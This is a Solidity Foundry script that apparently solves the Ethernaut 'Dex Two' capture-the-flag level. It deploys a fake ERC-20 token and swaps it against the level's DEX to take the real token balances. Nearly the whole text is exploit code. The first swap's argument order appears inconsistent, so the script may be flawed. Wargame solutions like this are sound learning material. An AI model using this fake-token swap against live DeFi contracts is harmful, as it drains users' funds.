// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/dex2.sol";

contract AttackDexScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address level23 = 0x0a4Dee5fc56eB9c00363016619859E69B43efc23;
        DexTwo dex = DexTwo(payable(level23));
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.approve(address(dex), type(uint256).max);

        FakeToken fakeToken = new FakeToken(address(dex));
        fakeToken.approve(address(dex), type(uint256).max);
        fakeToken.mint(address(dex), 100);

        dex.swap(token1, address(fakeToken), 100);
        dex.swap(address(fakeToken), token2, 100);

        console.log("Balance of token1", dex.balanceOf(token1, address(dex)));
        console.log("Balance of token2", dex.balanceOf(token2, address(dex)));

        vm.stopBroadcast();
    }
}

contract FakeToken is SwappableTokenTwo {
    constructor(
        address dexInstance
    ) SwappableTokenTwo(dexInstance, "FakeToken", "FAKE", 100) {}

    function mint(address to, uint256 amount) public {
        super._mint(to, amount);
    }
}
